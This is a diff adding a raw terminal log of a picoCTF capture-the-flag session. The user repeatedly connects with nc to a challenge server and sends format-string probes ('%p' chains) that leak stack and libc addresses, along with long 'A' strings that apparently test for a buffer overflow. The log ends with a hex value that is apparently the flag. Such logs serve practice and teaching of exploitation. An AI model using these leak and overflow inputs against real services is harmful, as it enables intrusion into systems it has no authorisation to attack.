@@ -1,0 +1,29 @@
+kaizen_dragon-picoctf@webshell:~$ nc -v wily-courier.picoctf.net 54912
+Connection to wily-courier.picoctf.net (18.189.99.27) 54912 port [tcp/*] succeeded!
+ls
+ls
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+%pp
+kaizen_dragon-picoctf@webshell:~$ nc -v wily-courier.picoctf.net 54912
+Connection to wily-courier.picoctf.net (18.189.99.27) 54912 port [tcp/*] succeeded!
+AAAA%p|%p|%p|%p            
+AAAA0x11242260|0x78fbc8d218d0|0xa70257c70257c70|0x112438a0
+l
+sa
+kaizen_dragon-picoctf@webshell:~$ nc -v wily-courier.picoctf.net 54912
+Connection to wily-courier.picoctf.net (18.189.99.27) 54912 port [tcp/*] succeeded!
+AAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
+AAAA0x3ad27260|0x7dabcbcbe8d0|0x11|0x3ad288c4|(nil)|0x7ffc58428458|0x1cbeed710|(nil)|(nil)|(nil)|(nil)|0x9|0x7dabcbcc4660|0x7ffc58428388|0xf0b5ff|0x1
+^C
+kaizen_dragon-picoctf@webshell:~$ nc -v wily-courier.picoctf.net 54912
+Connection to wily-courier.picoctf.net (18.189.99.27) 54912 port [tcp/*] succeeded!
+AAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p||%p|%p|%p|%p||%p|%p|%p|%p||%p|%p|%p|%p||%p|%p|%p|%p|
+AAAA0x3158b260|0x76f61e8d18d0|0x11|0x3158c8f9|(nil)|0x7ffcf188c398|0x11eb00710|(nil)|(nil)|(nil)|(nil)|0x9|0x76f61e8d7660|0x7ffcf188c2c8|0xf0b5ff|0x1||0x400a8d|0x76f61e8e5b40|(nil)|0x400a40||0x3e7004007e0|0x3158b650|0x3158b260|0x400a40||0x76f61e505c87|0x1|0x7ffcf188c398|0x100008000||0x40090d|(nil)|0x5ef4eeab95c57820|0x4007e0|
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ls
+kaizen_dragon-picoctf@webshell:~$ nc -v wily-courier.picoctf.net 54912
+Connection to wily-courier.picoctf.net (18.189.99.27) 54912 port [tcp/*] succeeded!
+AAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p||%p|%p|%p|%p||%p|%p|%p|%p||%p|%p|%p|%p||%p|%p|%p|%p|
+AAAA0xe6a0260|0x7e1e2b4318d0|0x11|0xe6a18f9|(nil)|0x7ffc08153d08|0x12b660710|(nil)|(nil)|(nil)|(nil)|0x9|0x7e1e2b437660|0x7ffc08153c38|0xf0b5ff|0x1||0x400a8d|0x7e1e2b445b40|(nil)|0x400a40||0x3e7004007e0|0xe6a0650|0xe6a0260|0x400a40||0x7e1e2b065c87|0x1|0x7ffc08153d08|0x100008000||0x40090d|(nil)|0x409053384411ed53|0x4007e0|
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+c391ab2cfdaacbbeefd64c66b5cc73fe
